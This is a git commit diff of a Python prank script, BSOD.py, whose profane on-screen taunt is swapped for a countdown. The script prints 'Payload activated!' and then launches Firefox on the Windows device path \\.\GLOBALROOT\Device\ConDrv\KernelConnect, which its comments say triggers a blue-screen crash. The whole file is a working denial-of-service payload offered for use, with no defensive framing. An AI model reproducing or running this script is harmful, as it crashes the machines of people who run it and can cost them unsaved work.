0b21b9df70b9245f67421aef2dfda982070dd572
Flipp3rrr <flipp3rrr@protonmail.com>
2021-02-03 20:59:02 +0100

    Cleanup and clarifications

--- BSOD.py
+++ BSOD.py
@@ -1,65 +1,22 @@
 import time
 import os
 
-# Print "fuck you!!!"
-print("F", end='\r')
-time.sleep(.01)
-print("Fu", end='\r')
-time.sleep(.01)
-print("Fuc", end='\r')
-time.sleep(.01)
-print("Fuck", end='\r')
-time.sleep(.01)
-print("Fucki", end='\r')
-time.sleep(.01)
-print("Fuckin", end='\r')
-time.sleep(.01)
-print("Fucking", end='\r')
-time.sleep(.01)
-print("Fucking ", end='\r')
-time.sleep(.01)
-print("Fucking u", end='\r')
-time.sleep(.01)
-print("Fucking up", end='\r')
-time.sleep(.01)
-print("Fucking up ", end='\r')
-time.sleep(.01)
-print("Fucking up y", end='\r')
-time.sleep(.01)
-print("Fucking up yo", end='\r')
-time.sleep(.01)
-print("Fucking up you", end='\r')
-time.sleep(.01)
-print("Fucking up your", end='\r')
-time.sleep(.01)
-print("Fucking up your ", end='\r')
-time.sleep(.01)
-print("Fucking up your d", end='\r')
-time.sleep(.01)
-print("Fucking up your de", end='\r')
-time.sleep(.01)
-print("Fucking up your dev", end='\r')
-time.sleep(.01)
-print("Fucking up your devi", end='\r')
-time.sleep(.01)
-print("Fucking up your devic", end='\r')
-time.sleep(.01)
-print("Fucking up your device", end='\r')
-time.sleep(.1)
-print("Fucking up your device.", end='\r')
-time.sleep(.1)
-print("Fucking up your device..", end='\r')
-time.sleep(.1)
-print("Fucking up your device...\n")
-
 # Wait for 10 seconds
+print("BSOD in 10 seconds", end="\r")
+time.sleep(.5)
+print("BSOD in 10 seconds.", end="\r")
+time.sleep(.5)
+print("BSOD in 10 seconds..", end="\r")
+time.sleep(.5)
+print("BSOD in 10 seconds...")
 for n in range(0, 11):
-  print("Progress >> %s/10" % n, end='\r')
+  print("Progress >> %s/10" % n, end="\r")
   time.sleep(1)
 print("Payload activated!")
 
 # Windows BSODs when you enter `\\.\GLOBALROOT\Device\ConDrv\KernelConnect`
-# into a browser :3
+# into a browser. Sadly this doesn't work on the built-in Internet Explorer,
+# I'll test Edge later.
 
-# Open in browser
+# Open in Firefox
 os.system("cmd /c start firefox -private \"\\\\.\\GLOBALROOT\\Device\\ConDrv\\KernelConnect\"")
